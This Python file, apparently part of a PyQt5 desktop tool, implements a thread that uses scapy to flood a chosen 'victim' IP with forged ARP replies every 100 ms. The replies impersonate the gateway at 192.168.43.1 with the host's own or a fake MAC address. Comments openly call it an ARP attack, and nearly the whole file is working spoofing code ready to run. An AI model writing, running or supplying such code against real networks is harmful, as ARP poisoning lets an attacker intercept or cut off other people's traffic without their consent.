# coding:utf-8
from PyQt5.QtCore import Qt, QThread, pyqtSignal
from scapy.all import send, ARP
from scapy.contrib.mqtt import MQTTPublish
from psutil import net_if_addrs


class ArpAttackThread(QThread):
    """ ARP 攻击线程 """

    arpAttackStateChangedSignal = pyqtSignal(str)

    def __init__(self, parent=None):
        super().__init__(parent=parent)
        self.targetIP = ''
        # 攻击标志位
        self.isStopArp = True
        self.isSendMyTrueMac = True
        self.wlanMac = self.getWlanMac()
        self.fakeMac = '11:22:33:44:55:66'

    def run(self):
        """ 开始 ARP 攻击 """
        while not self.isStopArp:
            send(ARP(psrc='192.168.43.1', pdst=self.targetIP,
                     hwsrc=self.wlanMac if self.isSendMyTrueMac else self.fakeMac), verbose=False)
            self.msleep(100)

    def stopArpAttack(self):
        """ 停止 ARP 攻击 """
        self.isStopArp = True
        self.arpAttackStateChangedSignal.emit(
            f'👺 已停止对 {self.targetIP} 的 ARP 攻击')

    def startArpAttack(self, targetIP: str = '', isSendMyMac: bool = True):
        """ 开始 ARP 攻击

        Parameters
        ----------
        targetIP : str
            受害者IP地址

        isSendMyMac : bool
            是否使用自己的 MAC 地址来伪装网关 MAC 地址
        """
        if not (self.targetIP or targetIP):
            raise Exception('在没有设置目标主机 IP 的情况下 targetIP 参数不能为空')
        if not self.isStopArp:
            self.arpAttackStateChangedSignal.emit(
                f'😆 客官别急，还在对 {self.targetIP} ARP 攻击呢...')
            return
        self.targetIP = targetIP
        self.arpAttackStateChangedSignal.emit(
            f'👺 正在对 {self.targetIP} 进行 ARP 攻击...')
        self.isStopArp = False
        self.start()

    def setArpAttackTarget(self, targetIP: str, isSendMyMac: bool = True):
        """ 开始ARP攻击

        Parameters
        ----------
        targetIP : str
            受害者IP地址

        isSendMyMac : bool
            是否使用自己的 MAC 地址来伪装网关 MAC 地址
        """
        self.targetIP = targetIP
        self.isSendMyTrueMac = isSendMyMac

    @ staticmethod
    def getWlanMac() -> str:
        """ 获取本机 WLAN 网卡 MAC 地址 """
        address = ''
        for k, v in net_if_addrs().items():
            if k == 'WLAN':
                for item in v:
                    if '-' in item[1] and len(item[1]) == 17:
                        address = item[1]
        return address.replace('-', ':')
